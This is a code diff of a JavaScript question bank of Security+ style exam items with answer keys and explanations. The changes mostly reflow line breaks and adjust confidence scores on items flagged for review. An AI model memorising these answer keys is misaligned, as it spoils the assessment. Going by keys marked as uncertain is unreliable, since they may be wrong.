-    "explanation": "A firewall log is the most relevant log to review first when investigating the initial exploit of an IoT\ndevice. Firewalls monitor and log network traffic, including incoming and outgoing connections,\nwhich can reveal suspicious activity or unauthorized access attempts targeting the IoT device.\nBy analyzing these logs, the security analyst can pinpoint the time and source of the initial\nexploit.",
+    "explanation": "A firewall log is the most relevant log to review first when investigating the initial exploit of an IoT device. Firewalls monitor and log network traffic, including incoming and outgoing connections, which can reveal suspicious activity or unauthorized access attempts targeting the IoT device.\nBy analyzing these logs, the security analyst can pinpoint the time and source of the initial exploit.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3260,7 +3222,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "Which of the following most accurately describes the order in which a security engineer should\nimplement secure baselines?",
+    "question": "Which of the following most accurately describes the order in which a security engineer should implement secure baselines?",
     "choices": [
       {
         "key": "A",
@@ -3282,7 +3244,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Establish: Create the secure baseline by defining the standard configurations, security settings,\nand policies required for systems and applications.\nDeploy: Apply the secure baseline to the systems and environments to ensure compliance with\nthe defined standards.\nMaintain: Continuously monitor and update the baseline as needed to adapt to new threats,\nvulnerabilities, or changes in requirements.",
+    "explanation": "Establish: Create the secure baseline by defining the standard configurations, security settings, and policies required for systems and applications.\nDeploy: Apply the secure baseline to the systems and environments to ensure compliance with the defined standards.\nMaintain: Continuously monitor and update the baseline as needed to adapt to new threats, vulnerabilities, or changes in requirements.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3298,7 +3260,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A SOC analyst establishes a remote control session on an end user's machine and discovers\nthe following in a file:\ngmail.com[ENT]my.name@gmail.com[ENT]NoOneCanGuessThis123! [ENT]Hello Susan, it was\ngreat to see you the other day! Let's plan a followup[BACKSPACE]follow-up meeting\nsoon. Here is the link to register. [RTN][CTRL]c [CTRL]v [RTN]after [BACKSPACE]After\nyou register give me a call on my cellphone.\nWhich of the following actions should the SOC analyst perform first?",
+    "question": "A SOC analyst establishes a remote control session on an end user's machine and discovers the following in a file:\ngmail.com[ENT]my.name@gmail.com[ENT]NoOneCanGuessThis123! [ENT]Hello Susan, it was great to see you the other day! Let's plan a followup[BACKSPACE]follow-up meeting soon. Here is the link to register. [RTN][CTRL]c [CTRL]v [RTN]after [BACKSPACE]After you register give me a call on my cellphone.\nWhich of the following actions should the SOC analyst perform first?",
     "choices": [
       {
         "key": "A",
@@ -3336,7 +3298,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "multi",
-    "question": "A security analyst needs to improve the company's authentication policy following a password\naudit.\nWhich of the following should be included in the policy? (Choose two.)",
+    "question": "A security analyst needs to improve the company's authentication policy following a password audit.\nWhich of the following should be included in the policy? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -3367,7 +3329,7 @@ export const domain4Questions = [
       "A",
       "B"
     ],
-    "explanation": "Length: Longer passwords are more resistant to brute-force attacks. Requiring a minimum\nlength (e.g., 12-16 characters) significantly improves password security.\nComplexity: Ensuring passwords include a mix of uppercase letters, lowercase letters,\nnumbers, and special characters makes them harder to guess or crack using dictionary attacks.\nIncluding both length and complexity in the authentication policy helps to enhance overall\npassword strength and security.",
+    "explanation": "Length: Longer passwords are more resistant to brute-force attacks. Requiring a minimum length (e.g., 12-16 characters) significantly improves password security.\nComplexity: Ensuring passwords include a mix of uppercase letters, lowercase letters, numbers, and special characters makes them harder to guess or crack using dictionary attacks.\nIncluding both length and complexity in the authentication policy helps to enhance overall password strength and security.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3405,7 +3367,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "A continuous risk is an ongoing threat that requires ongoing mitigation and monitoring efforts.\nPhishing attempts are a continuous risk to organizations as attackers frequently target users via\nemails. An email gateway acts as a treatment strategy by actively filtering out malicious emails,\nthereby reducing the likelihood of successful phishing attacks. This proactive approach\naddresses the ongoing nature of the threat.",
+    "explanation": "A continuous risk is an ongoing threat that requires ongoing mitigation and monitoring efforts.\nPhishing attempts are a continuous risk to organizations as attackers frequently target users via emails. An email gateway acts as a treatment strategy by actively filtering out malicious emails, thereby reducing the likelihood of successful phishing attacks. This proactive approach addresses the ongoing nature of the threat.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3421,7 +3383,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "multi",
-    "question": "Which of the following are the first steps an analyst should perform when developing a heat\nmap? (Choose two.)",
+    "question": "Which of the following are the first steps an analyst should perform when developing a heat map? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -3452,13 +3414,13 @@ export const domain4Questions = [
       "A",
       "C"
     ],
-    "explanation": "Methodically walk around the office noting Wi-Fi signal strength: This is essential for identifying\nareas with weak or strong signals and understanding the coverage gaps or interference points,\nwhich are crucial for developing an accurate heat map.\nCreate or obtain a layout of the office: A layout is necessary to map the signal strength data\nagainst the physical environment, enabling proper visualization of signal coverage and\npinpointing issues.\nThese two steps provide the foundation for creating a meaningful heat map to analyze wireless\nnetwork performance.",
+    "explanation": "Methodically walk around the office noting Wi-Fi signal strength: This is essential for identifying areas with weak or strong signals and understanding the coverage gaps or interference points, which are crucial for developing an accurate heat map.\nCreate or obtain a layout of the office: A layout is necessary to map the signal strength data against the physical environment, enabling proper visualization of signal coverage and pinpointing issues.\nThese two steps provide the foundation for creating a meaningful heat map to analyze wireless network performance.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
     "source": "SY0-701_en.pdf#p153",
     "needsReview": true,
-    "inferenceConfidence": 0.5,
+    "inferenceConfidence": 0.833,
     "needsExplanation": false,
     "keyCorrected": false
   },
@@ -3490,7 +3452,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "The Common Vulnerability Scoring System (CVSS) is a standardized framework for assessing\nthe severity of vulnerabilities. It assigns a numerical score that helps organizations determine\nthe criticality of vulnerabilities and prioritize their remediation efforts based on the risk they pose.\nThis ensures efficient use of resources to address the most severe issues first.",
+    "explanation": "The Common Vulnerability Scoring System (CVSS) is a standardized framework for assessing the severity of vulnerabilities. It assigns a numerical score that helps organizations determine the criticality of vulnerabilities and prioritize their remediation efforts based on the risk they pose.\nThis ensures efficient use of resources to address the most severe issues first.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3506,7 +3468,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "multi",
-    "question": "A new corporate policy requires all staff to use multifactor authentication to access company\nresources.\nWhich of the following can be utilized to set up this form of identity and access management?\n(Choose two.)",
+    "question": "A new corporate policy requires all staff to use multifactor authentication to access company resources.\nWhich of the following can be utilized to set up this form of identity and access management?\n(Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -3537,7 +3499,7 @@ export const domain4Questions = [
       "A",
       "C"
     ],
-    "explanation": "Authentication tokens: Tokens, such as hardware or software-based one-time password (OTP)\ngenerators, are commonly used as one factor in multifactor authentication (MFA). They provide\nan additional layer of security beyond just a password.\nBiometrics: Biometric factors, such as fingerprint scans or facial recognition, are another\ncommon component of MFA, providing a \"something you are\" factor for identity verification.\nThese factors, when combined with something the user knows (e.g., a password), fulfill the\nrequirements for MFA by incorporating multiple layers of authentication.",
+    "explanation": "Authentication tokens: Tokens, such as hardware or software-based one-time password (OTP) generators, are commonly used as one factor in multifactor authentication (MFA). They provide an additional layer of security beyond just a password.\nBiometrics: Biometric factors, such as fingerprint scans or facial recognition, are another common component of MFA, providing a \"something you are\" factor for identity verification.\nThese factors, when combined with something the user knows (e.g., a password), fulfill the requirements for MFA by incorporating multiple layers of authentication.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3553,7 +3515,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A company is changing its mobile device policy. The company has the following requirements:\n• Company-owned devices\n• Ability to harden the devices\n• Reduced security risk\n• Compatibility with company resources\nWhich of the following would best meet these requirements?",
+    "question": "A company is changing its mobile device policy. The company has the following requirements:\n• Company-owned devices\n• Ability to harden the devices\n• Reduced security risk\n• Compatibility with company resources Which of the following would best meet these requirements?",
     "choices": [
       {
         "key": "A",
@@ -3591,7 +3553,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following activities should be performed first to compile a list of vulnerabilities in an\nenvironment?",
+    "question": "Which of the following activities should be performed first to compile a list of vulnerabilities in an environment?",
     "choices": [
       {
         "key": "A",
@@ -3617,7 +3579,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Automated scanning is the first step in identifying vulnerabilities in an environment. Tools that\nperform automated vulnerability scanning scan systems and networks for known vulnerabilities,\nmissing patches, misconfigurations, and other security weaknesses. This helps create an initial\nlist of vulnerabilities that can then be prioritized and addressed, often serving as the foundation\nfor further in-depth activities like penetration testing or threat hunting.",
+    "explanation": "Automated scanning is the first step in identifying vulnerabilities in an environment. Tools that perform automated vulnerability scanning scan systems and networks for known vulnerabilities, missing patches, misconfigurations, and other security weaknesses. This helps create an initial list of vulnerabilities that can then be prioritized and addressed, often serving as the foundation for further in-depth activities like penetration testing or threat hunting.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3633,7 +3595,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A program manager wants to ensure contract employees can only access the company's\ncomputers Monday through Friday from 9 a m. to 5 p.m.\nWhich of the following would best enforce this access control?",
+    "question": "A program manager wants to ensure contract employees can only access the company's computers Monday through Friday from 9 a m. to 5 p.m.\nWhich of the following would best enforce this access control?",
     "choices": [
       {
         "key": "A",
@@ -3655,7 +3617,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Group Policy Objects (GPOs) in a Windows environment allow administrators to enforce access\ncontrol policies, including restricting user logins based on time-of-day. By applying a GPO to\ncontract employees and configuring logon hours from Monday through Friday, 9 a.m. to 5 p.m.,\nthe organization can ensure that these users cannot log in outside of the specified hours. This is\nthe most effective way to enforce access control based on time.",
+    "explanation": "Group Policy Objects (GPOs) in a Windows environment allow administrators to enforce access control policies, including restricting user logins based on time-of-day. By applying a GPO to contract employees and configuring logon hours from Monday through Friday, 9 a.m. to 5 p.m., the organization can ensure that these users cannot log in outside of the specified hours. This is the most effective way to enforce access control based on time.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3671,7 +3633,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following analysis methods allows an organization to measure the exposure factor\nassociated with organizational assets?",
+    "question": "Which of the following analysis methods allows an organization to measure the exposure factor associated with organizational assets?",
     "choices": [
       {
         "key": "A",
@@ -3693,7 +3655,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Quantitative analysis is a risk assessment method that assigns numerical values to risk factors,\nincluding the Exposure Factor (EF) - which represents the percentage of an asset's value that\nwould be lost if a specific threat were realized. This approach helps organizations calculate the\nSingle Loss Expectancy (SLE) and Annualized Loss Expectancy (ALE), providing a data-driven\nmethod for risk management.",
+    "explanation": "Quantitative analysis is a risk assessment method that assigns numerical values to risk factors, including the Exposure Factor (EF) - which represents the percentage of an asset's value that would be lost if a specific threat were realized. This approach helps organizations calculate the Single Loss Expectancy (SLE) and Annualized Loss Expectancy (ALE), providing a data-driven method for risk management.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3731,7 +3693,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A firewall log records inbound and outbound network traffic, including source and destination IP\naddresses, port numbers, and connection attempts. Since port scans involve probing various\nports on a network, the firewall logs will provide visibility into the attacker's source IP address\nand help the analyst assess the nature of the scanning activity.",
+    "explanation": "A firewall log records inbound and outbound network traffic, including source and destination IP addresses, port numbers, and connection attempts. Since port scans involve probing various ports on a network, the firewall logs will provide visibility into the attacker's source IP address and help the analyst assess the nature of the scanning activity.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3747,7 +3709,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A security analyst is examining a penetration test report and notices that the tester pivoted to\ncritical internal systems with the same local user ID and password.\nWhich of the following would help prevent this in the future?",
+    "question": "A security analyst is examining a penetration test report and notices that the tester pivoted to critical internal systems with the same local user ID and password.\nWhich of the following would help prevent this in the future?",
     "choices": [
       {
         "key": "A",
@@ -3769,7 +3731,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "The penetration tester was able to pivot using the same local user ID and password, indicating\nthat systems were using local authentication rather than a centralized authentication\nmechanism. Implementing centralized authentication (such as Active Directory, LDAP, or\nRADIUS) with strong password policies would ensure that credentials are managed centrally,\nreducing the risk of credential reuse and lateral movement across systems. This approach also\nenables better monitoring and enforcement of security policies.",
+    "explanation": "The penetration tester was able to pivot using the same local user ID and password, indicating that systems were using local authentication rather than a centralized authentication mechanism. Implementing centralized authentication (such as Active Directory, LDAP, or RADIUS) with strong password policies would ensure that credentials are managed centrally, reducing the risk of credential reuse and lateral movement across systems. This approach also enables better monitoring and enforcement of security policies.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3785,7 +3747,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "A business provides long-term cold storage services to banks that are required to follow\nregulator-imposed data retention guidelines. Banks that use these services require that data is\ndisposed of in a specific manner at the conclusion of the regulatory threshold for data retention.\nWhich of the following aspects of data management is the most important to the bank in the\ndestruction of this data?",
+    "question": "A business provides long-term cold storage services to banks that are required to follow regulator-imposed data retention guidelines. Banks that use these services require that data is disposed of in a specific manner at the conclusion of the regulatory threshold for data retention.\nWhich of the following aspects of data management is the most important to the bank in the destruction of this data?",
     "choices": [
       {
         "key": "A",
@@ -3807,7 +3769,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Certification provides documented proof that data was destroyed in compliance with regulatory\nrequirements. This is critical for banks to demonstrate adherence to data retention and disposal\nmandates imposed by regulators.",
+    "explanation": "Certification provides documented proof that data was destroyed in compliance with regulatory requirements. This is critical for banks to demonstrate adherence to data retention and disposal mandates imposed by regulators.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3845,7 +3807,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Input validation ensures that user-supplied data is properly checked before processing,\neffectively preventing injection attacks such as SQL or command injections by rejecting\nmalicious input.",
+    "explanation": "Input validation ensures that user-supplied data is properly checked before processing, effectively preventing injection attacks such as SQL or command injections by rejecting malicious input.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3883,7 +3845,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Running the malware in a controlled sandbox environment allows the analyst to safely observe\nits behavior, including communication, persistence mechanisms, and payload delivery, providing\nthe most comprehensive analysis.",
+    "explanation": "Running the malware in a controlled sandbox environment allows the analyst to safely observe its behavior, including communication, persistence mechanisms, and payload delivery, providing the most comprehensive analysis.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3921,7 +3883,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "The containment phase focuses on limiting the scope and impact of an incident to prevent\nfurther damage or disruption, thereby helping to maintain business continuity during the\nresponse process.",
+    "explanation": "The containment phase focuses on limiting the scope and impact of an incident to prevent further damage or disruption, thereby helping to maintain business continuity during the response process.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3937,7 +3899,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "Which of the following activities is used to determine the reason an incident occurred, prior to\nclosing the incident?",
+    "question": "Which of the following activities is used to determine the reason an incident occurred, prior to closing the incident?",
     "choices": [
       {
         "key": "A",
@@ -3959,7 +3921,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Root cause analysis is the process of identifying the fundamental reason an incident occurred,\nensuring that underlying issues are addressed before the incident is closed.",
+    "explanation": "Root cause analysis is the process of identifying the fundamental reason an incident occurred, ensuring that underlying issues are addressed before the incident is closed.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -3997,7 +3959,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Static analysis examines code in a non-running state to uncover vulnerabilities without\nexecuting or exploiting them, ensuring you identify issues without actively attacking the system.",
+    "explanation": "Static analysis examines code in a non-running state to uncover vulnerabilities without executing or exploiting them, ensuring you identify issues without actively attacking the system.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4013,7 +3975,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "An administrator needs to ensure all emails sent and received by a specific address are stored\nin a non-alterable format.\nWhich of the following best describes this forensic concept?",
+    "question": "An administrator needs to ensure all emails sent and received by a specific address are stored in a non-alterable format.\nWhich of the following best describes this forensic concept?",
     "choices": [
       {
         "key": "A",
@@ -4035,7 +3997,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Acquisition refers to the process of capturing and preserving digital evidence in a forensically\nsound, non-alterable format (e.g., bit-for-bit imaging or write-once storage), ensuring the\nintegrity of the emails for later analysis.",
+    "explanation": "Acquisition refers to the process of capturing and preserving digital evidence in a forensically sound, non-alterable format (e.g., bit-for-bit imaging or write-once storage), ensuring the integrity of the emails for later analysis.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4051,7 +4013,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A company recently purchased a new building that does not have an existing wireless or wired\ninfrastructure. A\nnetwork engineer at the company needs to determine the placement of the access points in the\nnew building.\nWhich of the following accurately describes the task the network engineer will be performing?",
+    "question": "A company recently purchased a new building that does not have an existing wireless or wired infrastructure. A network engineer at the company needs to determine the placement of the access points in the new building.\nWhich of the following accurately describes the task the network engineer will be performing?",
     "choices": [
       {
         "key": "A",
@@ -4073,7 +4035,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A site survey involves evaluating the physical environment, measuring building materials,\ninterference sources, and coverage requirements, to determine optimal access-point placement.",
+    "explanation": "A site survey involves evaluating the physical environment, measuring building materials, interference sources, and coverage requirements, to determine optimal access-point placement.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4089,7 +4051,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A user attempts to send an invoice to a customer.\nWhen the user follows up with the customer to see if the invoice was received, the customer\ninforms the user that it went to the spam folder. The management team has asked the systems\nadministrator to implement measures to reduce the likelihood of this happening again by\nimplementing server authentication.\nWhich of the following should the systems administrator implement?",
+    "question": "A user attempts to send an invoice to a customer.\nWhen the user follows up with the customer to see if the invoice was received, the customer informs the user that it went to the spam folder. The management team has asked the systems administrator to implement measures to reduce the likelihood of this happening again by implementing server authentication.\nWhich of the following should the systems administrator implement?",
     "choices": [
       {
         "key": "A",
@@ -4111,7 +4073,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "SPF (Sender Policy Framework) lets the domain owner specify which mail servers are\nauthorized to send email on its behalf. Publishing an SPF record in DNS helps recipient mail\nsystems verify the sending server's legitimacy, reducing the chance that legitimate messages\nare marked as spam.",
+    "explanation": "SPF (Sender Policy Framework) lets the domain owner specify which mail servers are authorized to send email on its behalf. Publishing an SPF record in DNS helps recipient mail systems verify the sending server's legitimacy, reducing the chance that legitimate messages are marked as spam.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4149,7 +4111,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A SIEM's primary value is aggregating and correlating log data from numerous systems to\nidentify patterns or anomalies that span multiple hosts, enabling detection of coordinated or\nsophisticated attacks.",
+    "explanation": "A SIEM's primary value is aggregating and correlating log data from numerous systems to identify patterns or anomalies that span multiple hosts, enabling detection of coordinated or sophisticated attacks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4187,7 +4149,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Adjusting and refining detection rules reduces false positives and irrelevant alerts, ensuring that\nsecurity teams receive only meaningful notifications and thereby minimizing alert fatigue.",
+    "explanation": "Adjusting and refining detection rules reduces false positives and irrelevant alerts, ensuring that security teams receive only meaningful notifications and thereby minimizing alert fatigue.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4203,7 +4165,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "A company is concerned with supply chain compromise of new servers and wants to limit this\nrisk.\nWhich of the following should the company review first?",
+    "question": "A company is concerned with supply chain compromise of new servers and wants to limit this risk.\nWhich of the following should the company review first?",
     "choices": [
       {
         "key": "A",
@@ -4225,7 +4187,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Reviewing the acquisition process allows the company to vet vendors, enforce secure\nprocurement controls, and verify hardware integrity before servers enter the environment,\ndirectly mitigating supply chain compromise risks.",
+    "explanation": "Reviewing the acquisition process allows the company to vet vendors, enforce secure procurement controls, and verify hardware integrity before servers enter the environment, directly mitigating supply chain compromise risks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4241,7 +4203,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A software developer wishes to implement an application security technique that will provide\nassurance of the application's integrity.\nWhich of the following techniques will achieve this?",
+    "question": "A software developer wishes to implement an application security technique that will provide assurance of the application's integrity.\nWhich of the following techniques will achieve this?",
     "choices": [
       {
         "key": "A",
@@ -4263,7 +4225,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Code signing uses digital signatures to verify that an application's binaries haven't been altered\nsince they were signed, providing cryptographic assurance of the software's integrity.",
+    "explanation": "Code signing uses digital signatures to verify that an application's binaries haven't been altered since they were signed, providing cryptographic assurance of the software's integrity.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4279,7 +4241,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A company recently set up a system for employees to access their files remotely. However, the\nIT team has noticed that some employees are using personal devices to access the system.\nWhich of the following security techniques could help mitigate the risk of unauthorized\nconnections by personal devices?",
+    "question": "A company recently set up a system for employees to access their files remotely. However, the IT team has noticed that some employees are using personal devices to access the system.\nWhich of the following security techniques could help mitigate the risk of unauthorized connections by personal devices?",
     "choices": [
       {
         "key": "A",
@@ -4301,7 +4263,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Conditional Access lets you enforce device-based requirements, such as requiring devices to be\nenrolled, compliant, or managed, before granting access. By blocking or limiting connections\nfrom unmanaged personal devices, it prevents unauthorized endpoints from reaching the\ncompany's remote file system.",
+    "explanation": "Conditional Access lets you enforce device-based requirements, such as requiring devices to be enrolled, compliant, or managed, before granting access. By blocking or limiting connections from unmanaged personal devices, it prevents unauthorized endpoints from reaching the company's remote file system.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4339,7 +4301,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "When a site is unreachable, the first step is to verify whether network traffic is being blocked.\nFirewall logs will show if connection attempts to the external site are being denied or dropped,\npinpointing whether the firewall is preventing access.",
+    "explanation": "When a site is unreachable, the first step is to verify whether network traffic is being blocked.\nFirewall logs will show if connection attempts to the external site are being denied or dropped, pinpointing whether the firewall is preventing access.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4355,7 +4317,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A Chief Information Security Officer wants to enhance security capabilities to block PH from\nbeing emailed or downloaded to unapproved external media.\nWhich of the following solutions will accomplish this goal?",
+    "question": "A Chief Information Security Officer wants to enhance security capabilities to block PH from being emailed or downloaded to unapproved external media.\nWhich of the following solutions will accomplish this goal?",
     "choices": [
       {
         "key": "A",
@@ -4377,7 +4339,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Data Loss Prevention (DLP) solutions inspect content in motion and at rest, across email, web\nuploads, removable media, and more, and enforce policies to block or quarantine protected\nhealth information (PHI) from being transmitted to unapproved destinations. By deploying DLP\nagents on both servers and endpoints, the organization gains granular control over where\nsensitive data can flow, effectively preventing PH from being emailed or copied to unauthorized\nexternal media.",
+    "explanation": "Data Loss Prevention (DLP) solutions inspect content in motion and at rest, across email, web uploads, removable media, and more, and enforce policies to block or quarantine protected health information (PHI) from being transmitted to unapproved destinations. By deploying DLP agents on both servers and endpoints, the organization gains granular control over where sensitive data can flow, effectively preventing PH from being emailed or copied to unauthorized external media.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4393,7 +4355,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "After a breach at a data processing center, an administrator receives a notification that\nadministrative passwords were leaked online.\nWhich of the following should be used to prevent this incident from occurring in the future?",
+    "question": "After a breach at a data processing center, an administrator receives a notification that administrative passwords were leaked online.\nWhich of the following should be used to prevent this incident from occurring in the future?",
     "choices": [
       {
         "key": "A",
@@ -4415,7 +4377,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A centralized password vault securely stores and manages privileged credentials, encrypting\nthem at rest, controlling access, and enabling strong rotation policies, so administrative\npasswords are never exposed in plaintext and can't be leaked online.",
+    "explanation": "A centralized password vault securely stores and manages privileged credentials, encrypting them at rest, controlling access, and enabling strong rotation policies, so administrative passwords are never exposed in plaintext and can't be leaked online.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4431,7 +4393,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "Which of the following would best prepare a security team for a specific incident response\nscenario?",
+    "question": "Which of the following would best prepare a security team for a specific incident response scenario?",
     "choices": [
       {
         "key": "A",
@@ -4453,7 +4415,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A tabletop exercise walks the security team through a realistic incident scenario in a low-stakes\nenvironment, allowing them to practice roles, decisions, and coordination before a real event\noccurs.",
+    "explanation": "A tabletop exercise walks the security team through a realistic incident scenario in a low-stakes environment, allowing them to practice roles, decisions, and coordination before a real event occurs.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -4469,7 +4431,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "The Chief Executive Officer has requested that a vendor conduct a penetration test without\nengaging the internal IT team to validate the company's investment in security tools, awareness\ntraining, and SOC personnel.\nWhich of the following penetration testing methods is most likely being used?",
+    "question": "The Chief Executive Officer has requested that a vendor conduct a penetration test without engaging the internal IT team to validate the company's investment in security tools, awareness training, and SOC personnel.\nWhich of the following penetration testing methods is most likely being used?",
     "choices": [
       {
         "key": "A",
@@ -4491,13 +4453,13 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "An \"unknown\" (black-box) test gives the testers no prior information or coordination with internal\nteams, mimicking an external attacker and validating defenses without internal assistance.",
+    "explanation": "An \"unknown\" (black-box) test gives the testers no prior information or coordination with internal teams, mimicking an external attacker and validating defenses without internal assistance.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
     "source": "SY0-701_en.pdf#p198",
     "needsReview": true,
-    "inferenceConfidence": 0.667,
+    "inferenceConfidence": 0.4,
     "needsExplanation": false,
     "keyCorrected": false
   },
@@ -4529,7 +4491,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "An accurate inventory of corporate laptops is essential to ensure that every affected device is\nidentified and included in the patch deployment process. Without a complete asset inventory,\nsome laptops could be missed and remain vulnerable.",
+    "explanation": "An accurate inventory of corporate laptops is essential to ensure that every affected device is identified and included in the patch deployment process. Without a complete asset inventory, some laptops could be missed and remain vulnerable.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
